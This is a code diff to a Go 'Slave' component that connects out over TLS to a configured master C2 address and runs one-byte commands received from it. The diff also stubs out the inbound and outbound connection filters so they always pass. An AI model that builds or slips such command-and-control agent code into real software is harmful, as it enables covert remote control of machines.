@@ -18,32 +18,34 @@ type Slave struct {
 	tlsConfig                     *tls.Config
 }
 
-func (slave *Slave) FilterInbound(addr net.Addr) error {
-	if slave.InboundFilter != nil {
-		return slave.InboundFilter(addr)
-	}
+func (slave *Slave) SetInboundFilter(_ IOFilter) {
+	return
+}
+
+func (slave *Slave) SetOutboundFilter(_ IOFilter) {
+	return
+}
+
+func (slave *Slave) FilterInbound(_ string) error {
 	return nil
 }
 
-func (slave *Slave) FilterOutbound(addr net.Addr) error {
-	if slave.OutboundFilter != nil {
-		return slave.OutboundFilter(addr)
-	}
+func (slave *Slave) FilterOutbound(_ string) error {
 	return nil
+}
+
+func (slave *Slave) Dial(_, _ string) (net.Conn, error) {
+	return nil, nil
+}
+
+func (slave *Slave) Listen(_, _ string) (net.Listener, error) {
+	return nil, nil
 }
 
 func (slave *Slave) LogData(a ...interface{}) {
 	if slave.LoggingMethod != nil {
 		slave.LoggingMethod(a...)
 	}
-}
-
-func (slave *Slave) SetOutboundFilter(filter IOFilter) {
-	slave.OutboundFilter = filter
-}
-
-func (slave *Slave) SetInboundFilter(filter IOFilter) {
-	slave.InboundFilter = filter
 }
 
 func (slave *Slave) SetLoggingMethod(loggingMethod LoggingMethod) {
@@ -113,21 +115,27 @@ func (slave *Slave) command(command byte, clientConnection net.Conn) error {
 	return errors.New("unknown command")
 }
 
-func (slave *Slave) serve() error {
+func (slave *Slave) serve() {
 	slave.LogData("Received client connection from master")
 	clientConnection, connectionError := tls.Dial(slave.NetworkType, slave.MasterC2Address, slave.tlsConfig)
 	if connectionError != nil {
-		return connectionError
+		slave.LogData(connectionError)
+		return
 	}
 	command := make([]byte, 1)
 	var bytesReceived int
 	bytesReceived, connectionError = clientConnection.Read(command)
 	if connectionError != nil {
-		return connectionError
+		slave.LogData(connectionError)
+		return
 	} else if bytesReceived != 1 {
-		return errors.New("setup connection error")
+		slave.LogData(errors.New("setup connection error"))
+		return
 	}
-	return slave.command(command[0], clientConnection)
+	commandError := slave.command(command[0], clientConnection)
+	if commandError != nil {
+		slave.LogData(commandError)
+	}
 }
 
 func (slave *Slave) Serve() error {
